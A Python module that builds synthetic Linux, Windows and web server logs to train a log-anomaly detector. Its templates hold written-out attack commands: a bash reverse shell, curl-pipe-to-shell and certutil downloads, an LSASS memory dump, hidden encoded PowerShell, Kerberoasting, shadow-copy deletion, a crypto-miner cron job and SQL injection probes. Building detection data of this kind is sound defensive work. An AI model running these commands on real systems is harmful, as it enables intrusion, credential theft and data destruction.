"""Synthetic log scenarios so the model sees Linux, Windows, web and app cases before you have real labels.

Every line is built from templates with randomized hosts, IPs, PIDs, units and numbers, then goes through
the real parsers and clustering, so the training input looks exactly like a real scan.
"""
from __future__ import annotations

import random
from datetime import datetime, timedelta

from ..collectors.textlogs import parse_app_log, parse_syslog

HOSTS = ["web01", "db01", "fileserver", "build-agent", "ws-dev", "nas", "homeserver", "k3s-node1", "mail01", "laptop"]
WIN_HOSTS = ["WS-FIN07", "DC01", "FS01", "LAPTOP-7Q2", "SQL01", "WKSTN-114"]
UNITS = ["camera-stream", "mqtt-bridge", "inference", "grafana-server", "node-red", "docker", "homeassistant",
         "octoprint", "nginx", "postgresql", "wireguard"]
APPS = ["worker", "api", "detector", "scheduler", "ingest"]

# (program, message template, repeat range). {ip} {n} {pid} {unit} {user} {dev} {port} {temp} {addr} are filled.
INTERESTING = [
    ("kernel", "[{n}.{n}] hwmon hwmon1: Undervoltage detected!", (1, 6)),
    ("kernel", "[{n}.{n}] mmc0: timeout waiting for hardware interrupt.", (1, 4)),
    ("kernel", "[{n}.{n}] blk_update_request: I/O error, dev {dev}, sector {n} op 0x1:(WRITE) flags 0x800", (1, 8)),
    ("kernel", "[{n}.{n}] EXT4-fs error (device {dev}p2): ext4_lookup:1785: inode #{n}: comm {unit}: deleted inode referenced", (1, 3)),
    ("kernel", "[{n}.{n}] EXT4-fs ({dev}p2): Remounting filesystem read-only", (1, 1)),
    ("kernel", "[{n}.{n}] Out of memory: Killed process {pid} ({unit}) total-vm:{n}kB, anon-rss:{n}kB", (1, 3)),
    ("kernel", "[{n}.{n}] {unit}[{pid}]: segfault at {addr} ip {addr} sp {addr} error 4 in libc.so.6", (1, 5)),
    ("kernel", "[{n}.{n}] cpu cpu0: thermal throttling: temperature above threshold {temp}C", (1, 10)),
    ("kernel", "[{n}.{n}] nvgpu: 17000000.gv11b gk20a_fifo_handle_pbdma_intr:2645 [ERR] pbdma_intr_0(0):0x{n}", (1, 6)),
    ("kernel", "[{n}.{n}] NVRM: Xid (PCI:0000:01:00): 79, GPU has fallen off the bus.", (1, 1)),
    ("kernel", "[{n}.{n}] usb 1-1.{n}: device descriptor read/64, error -71", (2, 8)),
    ("kernel", "[{n}.{n}] INFO: task {unit}:{pid} blocked for more than 120 seconds.", (1, 3)),
    ("kernel", "[{n}.{n}] [UFW BLOCK] IN=eth0 OUT= SRC={ip} DST=192.168.1.10 PROTO=TCP SPT={port} DPT=23", (20, 60)),
    ("sshd", "Failed password for invalid user {user} from {ip} port {port} ssh2", (5, 80)),
    ("sshd", "Accepted password for {luser} from {ip} port {port} ssh2", (1, 2)),
    # post-compromise activity (tool catalog signatures)
    ("sudo", "  {luser} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://{ip}/t/linpeas.sh -O /tmp/linpeas.sh", (1, 1)),
    ("sudo", "  {luser} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -fsSL http://{ip}/i.sh | sh", (1, 1)),
    ("sudo", "  {luser} : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/{ip}/{port} 0>&1", (1, 1)),
    ("CRON", "(root) CMD (/tmp/.cache/xmrig -o stratum+tcp://pool.example.net:3333 -B)", (2, 12)),
    ("crontab", "(root) REPLACE (root)", (1, 1)),
    ("sudo", "pam_unix(sudo:auth): authentication failure; logname={user} uid=1000 euid=0 tty=/dev/pts/0 ruser={user} rhost=  user={user}", (1, 4)),
    ("useradd", "new user: name={user}, UID=1001, GID=1001, home=/home/{user}, shell=/bin/bash", (1, 1)),
    ("systemd", "{unit}.service: Main process exited, code=exited, status=1/FAILURE", (1, 3)),
    ("systemd", "{unit}.service: Scheduled restart job, restart counter is at {n}.", (3, 20)),
    ("systemd", "{unit}.service: Start request repeated too quickly.", (1, 1)),
    ("systemd-resolved", "Using degraded feature set UDP instead of UDP+EDNS0 for DNS server 1.1.1.1.", (1, 3)),
    ("dhcpcd", "eth0: carrier lost", (1, 6)),
    ("kernel", "[{n}.{n}] audit: type=1400 audit({n}.{n}:{n}): apparmor=\"DENIED\" operation=\"open\" profile=\"{unit}\" name=\"/etc/shadow\"", (1, 3)),
]
ROUTINE = [
    ("CRON", "(root) CMD (/usr/local/bin/backup.sh)", (10, 60)),
    ("systemd", "Started {unit}.service - {unit} daemon.", (1, 3)),
    ("systemd", "Starting Daily apt download activities...", (1, 2)),
    ("systemd", "Finished Clean php session files.", (1, 2)),
    ("rsyslogd", "[origin software=\"rsyslogd\"] rsyslogd was HUPed", (1, 2)),
    ("dhcpcd", "eth0: leased 192.168.1.{n} for 86400 seconds", (1, 4)),
    ("systemd-timesyncd", "Initial clock synchronization to Thu 2026-11-06 10:00:00.123 UTC.", (1, 1)),
    ("kernel", "[{n}.{n}] IPv6: ADDRCONF(NETDEV_CHANGE): wlan0: link becomes ready", (1, 2)),
    ("sshd", "pam_unix(sshd:session): session opened for user {luser}(uid=1000) by (uid=0)", (1, 5)),
    ("systemd-logind", "New session {n} of user {luser}.", (1, 5)),
    ("sshd", "Accepted publickey for {luser} from 192.168.1.{n} port {port} ssh2: ED25519 SHA256:abc", (1, 3)),
    ("sudo", "  {luser} : TTY=pts/0 ; PWD=/home/{luser} ; USER=root ; COMMAND=/usr/bin/apt upgrade -y", (1, 2)),
    ("CRON", "(root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)", (10, 40)),
    ("NetworkManager", "<info>  [{n}.{n}] dhcp4 (wlan0): state changed new lease, address=192.168.1.{n}", (1, 4)),
    ("anacron", "Job `cron.daily' terminated", (1, 1)),
    ("kernel", "[{n}.{n}] Bluetooth: hci0: BCM: firmware Patch file not found, tried: 'brcm/BCM4345C0.hcd'", (1, 2)),
]
APP_INTERESTING = [
    ["ERROR {app}: failed to process job {n}", "Traceback (most recent call last):",
     '  File "/srv/{app}/main.py", line {n}, in run', "    result = handler(msg)",
     "KeyError: 'payload'"],
    ["ERROR {app}: inference failed", "Traceback (most recent call last):",
     '  File "/srv/{app}/model.py", line {n}, in infer', "RuntimeError: CUDA out of memory. Tried to allocate {n}.00 MiB"],
    ["CRITICAL {app}: database is locked, giving up after {n} retries"],
    ["WARNING {app}: connection refused to {ip}:5432, retrying in {n}s"],
    ["ERROR {app}: 401 Unauthorized from api.example.com: invalid token"],
    ["ERROR {app}: [Errno 24] Too many open files"],
]
APP_ROUTINE = ["INFO {app}: processed batch {n} in {n}ms", "DEBUG {app}: heartbeat ok",
               "INFO {app}: config reloaded", "INFO {app}: served GET /health 200 in {n}ms"]


def _fill(t: str, rnd: random.Random, ctx: dict) -> str:
    rep = {
        "{n}": lambda: str(rnd.randint(1, 99999)), "{pid}": lambda: str(rnd.randint(300, 32000)),
        "{ip}": lambda: ctx["ip"], "{port}": lambda: str(rnd.randint(1024, 65000)),
        "{unit}": lambda: ctx["unit"], "{user}": lambda: ctx["user"], "{dev}": lambda: ctx["dev"],
        "{luser}": lambda: ctx.get("luser", "mreyes"),
        "{temp}": lambda: str(rnd.randint(80, 95)), "{addr}": lambda: hex(rnd.getrandbits(40)), "{app}": lambda: ctx["app"],
    }
    for k, f in rep.items():
        while k in t:
            t = t.replace(k, f(), 1)
    return t


def scenario(rnd: random.Random, now: datetime) -> tuple[list[str], list[str]]:
    """One fake host-day: a few interesting events buried in routine noise. Returns (syslog lines, app lines)."""
    host = rnd.choice(HOSTS)
    luser = rnd.choice(["mreyes", "deploy", "maria", "svc-backup", "ops"])
    lines: list[tuple[datetime, str]] = []
    picks = [(p, 1) for p in rnd.sample(INTERESTING, rnd.randint(0, 4))] + [(p, 0) for p in rnd.sample(ROUTINE, rnd.randint(3, 8))]
    for (prog, tmpl, (lo, hi)), _ in picks:
        ctx = {"ip": f"{rnd.randint(1, 223)}.{rnd.randint(0, 255)}.{rnd.randint(0, 255)}.{rnd.randint(1, 254)}",
               "unit": rnd.choice(UNITS), "user": rnd.choice(["admin", "test", "oracle", "ubuntu", "git", "pi"]),
               "luser": luser,
               "dev": rnd.choice(["mmcblk0", "sda", "nvme0n1"]), "app": rnd.choice(APPS)}
        start = now - timedelta(minutes=rnd.randint(30, 1400))
        for i in range(rnd.randint(lo, hi)):
            ts = start + timedelta(seconds=i * rnd.randint(1, 120))
            pid = f"[{rnd.randint(300, 32000)}]" if prog not in ("kernel",) else ""
            lines.append((ts, f"{ts:%b %e %H:%M:%S} {host} {prog}{pid}: {_fill(tmpl, rnd, ctx)}"))
    lines.sort()

    app: list[str] = []
    ctx = {"ip": "192.168.1.5", "unit": "", "user": "", "dev": "", "app": rnd.choice(APPS), "luser": luser}
    t = now - timedelta(hours=6)
    errs = rnd.sample(APP_INTERESTING, rnd.randint(0, 2))
    for i in range(rnd.randint(20, 60)):
        t += timedelta(seconds=rnd.randint(5, 600))
        if errs and rnd.random() < 0.08:
            block = rnd.choice(errs)
            app.append(f"{t:%Y-%m-%d %H:%M:%S},{rnd.randint(100, 999)} " + _fill(block[0], rnd, ctx))
            app.extend(_fill(x, rnd, ctx) for x in block[1:])
        else:
            app.append(f"{t:%Y-%m-%d %H:%M:%S},{rnd.randint(100, 999)} " + _fill(rnd.choice(APP_ROUTINE), rnd, ctx))
    return [l for _, l in lines], app


# ---------------------------------------------------------------- Windows (rendered without message templates,
# exactly like the .evtx reader does on Linux)
def _ip(rnd):
    return f"{rnd.randint(1, 223)}.{rnd.randint(0, 255)}.{rnd.randint(0, 255)}.{rnd.randint(1, 254)}"


WIN_INTERESTING = [  # (provider, event id, level, data, repeat range)
    ("Microsoft-Windows-Security-Auditing", "4625", 0, lambda r, c: {"TargetUserName": c["guess"], "LogonType": "3", "Status": "0xc000006d",
     "SubStatus": r.choice(["0xc000006a", "0xc0000064"]), "IpAddress": c["ip"], "WorkstationName": "KALI"}, (6, 60)),
    ("Microsoft-Windows-Security-Auditing", "4624", 0, lambda r, c: {"TargetUserName": c["user"], "LogonType": "10",
     "IpAddress": c["ip"], "AuthenticationPackageName": "Negotiate"}, (1, 2)),
    ("Microsoft-Windows-Security-Auditing", "4769", 0, lambda r, c: {"TargetUserName": c["user"] + "@CORP.LOCAL",
     "ServiceName": r.choice(["MSSQLService", "HTTP-svc", "sapservice", "backupsvc"]), "TicketEncryptionType": "0x17",
     "IpAddress": "::ffff:10.0.4." + str(r.randint(2, 250))}, (1, 4)),
    ("Microsoft-Windows-Security-Auditing", "4771", 0, lambda r, c: {"TargetUserName": r.choice(["j.smith", "a.lee", "svc_sql", "m.diaz"]),
     "ServiceName": "krbtgt", "Status": "0x18", "IpAddress": "::ffff:10.0.4." + str(r.randint(2, 250))}, (12, 80)),
    ("Microsoft-Windows-Security-Auditing", "4688", 0, lambda r, c: {"SubjectUserName": c["user"],
     "NewProcessName": r"C:\Windows\System32\certutil.exe", "ParentProcessName": r"C:\Windows\System32\cmd.exe",
     "CommandLine": f"certutil -urlcache -split -f http://{c['ip']}/a.exe C:\\Users\\Public\\a.exe"}, (1, 1)),
    ("Microsoft-Windows-Security-Auditing", "4688", 0, lambda r, c: {"SubjectUserName": c["user"],
     "NewProcessName": r"C:\Windows\System32\rundll32.exe",
     "CommandLine": f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {r.randint(500, 900)} C:\\Windows\\Temp\\d.dmp full"}, (1, 1)),
    ("Microsoft-Windows-Security-Auditing", "4688", 0, lambda r, c: {"SubjectUserName": c["user"],
     "NewProcessName": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     "CommandLine": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"}, (1, 2)),
    ("Microsoft-Windows-Security-Auditing", "4688", 0, lambda r, c: {"SubjectUserName": c["user"],
     "NewProcessName": r"C:\Windows\System32\vssadmin.exe", "CommandLine": "vssadmin delete shadows /all /quiet"}, (1, 1)),
    ("Microsoft-Windows-PowerShell", "4104", 3, lambda r, c: {"MessageNumber": "1", "MessageTotal": "1",
     "ScriptBlockText": r.choice(["Invoke-Kerberoast -OutputFormat Hashcat | fl", "Get-NetUser -SPN | select samaccountname",
                                  "IEX (New-Object Net.WebClient).DownloadString('http://" + c["ip"] + "/p.ps1')"])}, (1, 3)),
    ("Service Control Manager", "7045", 4, lambda r, c: {"ServiceName": r.choice(["PSEXESVC", "svchost32", "WinUpdSvc"]),
     "ImagePath": r.choice(["%SystemRoot%\\PSEXESVC.exe", "C:\\Users\\Public\\svc.exe"]), "AccountName": "LocalSystem"}, (1, 1)),
    ("Microsoft-Windows-Eventlog", "1102", 4, lambda r, c: {"SubjectUserName": c["user"]}, (1, 1)),
    ("Microsoft-Windows-Security-Auditing", "4720", 0, lambda r, c: {"TargetUserName": r.choice(["support2", "svc_backup", "admin1"]),
     "SubjectUserName": c["user"]}, (1, 1)),
]
WIN_ROUTINE = [
    ("Microsoft-Windows-Security-Auditing", "4624", 0, lambda r, c: {"TargetUserName": "SYSTEM", "LogonType": "5",
     "IpAddress": "-", "AuthenticationPackageName": "Negotiate"}, (20, 120)),
    ("Microsoft-Windows-Security-Auditing", "4624", 0, lambda r, c: {"TargetUserName": c["user"], "LogonType": "2",
     "IpAddress": "127.0.0.1"}, (1, 4)),
    ("Microsoft-Windows-Security-Auditing", "4688", 0, lambda r, c: {"SubjectUserName": c["user"],
     "NewProcessName": r.choice([r"C:\Program Files\Mozilla Firefox\firefox.exe", r"C:\Windows\explorer.exe",
                                 r"C:\Windows\System32\svchost.exe", r"C:\Program Files\Microsoft VS Code\Code.exe"]),
     "CommandLine": ""}, (5, 40)),
    ("Microsoft-Windows-Security-Auditing", "4769", 0, lambda r, c: {"TargetUserName": c["host"] + "$@CORP.LOCAL",
     "ServiceName": c["host"] + "$", "TicketEncryptionType": "0x12", "IpAddress": "::1"}, (5, 30)),
    ("Service Control Manager", "7036", 4, lambda r, c: {"param1": "Windows Update", "param2": "running"}, (2, 10)),
    ("Microsoft-Windows-DistributedCOM", "10016", 3, lambda r, c: {"param1": "application-specific"}, (2, 12)),
    ("Microsoft-Windows-PowerShell", "4104", 5, lambda r, c: {"MessageNumber": "1", "MessageTotal": "1",
     "ScriptBlockText": r.choice(["Get-ChildItem C:\\Logs | Remove-Item -Recurse", "Import-Module PSReadLine",
                                  "$PSVersionTable.PSVersion"])}, (1, 6)),
]


def win_scenario(rnd: random.Random, now: datetime) -> list:
    from ..collectors.windows import _fallback_message
    from ..model import Event
    host = rnd.choice(WIN_HOSTS)
    ctx = {"host": host, "user": rnd.choice(["mreyes", "m.diaz", "j.smith", "admin"]), "ip": _ip(rnd),
           "guess": rnd.choice(["administrator", "admin", "mreyes", "backup"])}
    evs = []
    picks = rnd.sample(WIN_INTERESTING, rnd.randint(0, 3)) + rnd.sample(WIN_ROUTINE, rnd.randint(3, 6))
    for prov, eid, level, data_fn, (lo, hi) in picks:
        start = now - timedelta(minutes=rnd.randint(30, 1400))
        chan = "System" if prov in ("Service Control Manager", "Microsoft-Windows-DistributedCOM") else \
            "Microsoft-Windows-PowerShell/Operational" if "PowerShell" in prov else "Security"
        for i in range(rnd.randint(lo, hi)):
            data = data_fn(rnd, ctx)
            sev = {0: 6, 2: 3, 3: 4, 4: 6, 5: 7}.get(level, 6)
            if eid == "4625":
                sev = 5  # audit failure
            evs.append(Event(ts=start + timedelta(seconds=i * rnd.randint(1, 90)), host=host, source=f"windows:{chan}",
                             severity=sev, message=_fallback_message(prov, eid, data), program=prov, event_id=eid,
                             fields=data))
    return evs


WEB_UAS = {"scan": ["sqlmap/1.8.2#stable (https://sqlmap.org)", "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)",
                    "gobuster/3.6", "Mozilla/5.0 zgrab/0.x"],
           "normal": ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0",
                      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15", "curl/8.5.0"]}


def web_scenario(rnd: random.Random, now: datetime) -> list[str]:
    from datetime import timezone
    t = now.astimezone(timezone.utc) - timedelta(hours=3)
    out, attacker = [], _ip(rnd)
    scan = rnd.random() < 0.5
    for i in range(rnd.randint(20, 60)):
        t += timedelta(seconds=rnd.randint(1, 120))
        if scan and rnd.random() < 0.3:
            ua, ip = rnd.choice(WEB_UAS["scan"]), attacker
            path = rnd.choice(["/.env", "/wp-login.php", "/admin/", "/api/item?id=1%27%20AND%201%3D1", "/backup.zip"])
            st = rnd.choice([404, 404, 403, 500])
        else:
            ua, ip = rnd.choice(WEB_UAS["normal"]), f"192.168.1.{rnd.randint(2, 250)}"
            path, st = rnd.choice(["/", "/static/app.js", "/api/items", "/login"]), rnd.choice([200, 200, 200, 304])
        out.append(f'{ip} - - [{t:%d/%b/%Y:%H:%M:%S +0000}] "GET {path} HTTP/1.1" {st} {rnd.randint(0, 9000)} "-" "{ua}"')
    return out


def synthetic_events(n_scenarios: int, seed: int = 7):
    """Yield lists of Events, one list per fake host-day: Linux syslog + app log, Windows, or a web server."""
    rnd = random.Random(seed)
    now = datetime.now().astimezone()
    for i in range(n_scenarios):
        kind = i % 3
        if kind == 1:
            yield win_scenario(rnd, now)
            continue
        sys_lines, app_lines = scenario(rnd, now)
        evs = list(parse_syslog(sys_lines, year=now.year))
        host = evs[0].host if evs else "host"
        evs += list(parse_app_log(app_lines, rnd.choice(APPS), host))
        if kind == 2:
            evs += list(parse_app_log(web_scenario(rnd, now), "nginx-access", host))
        yield evs
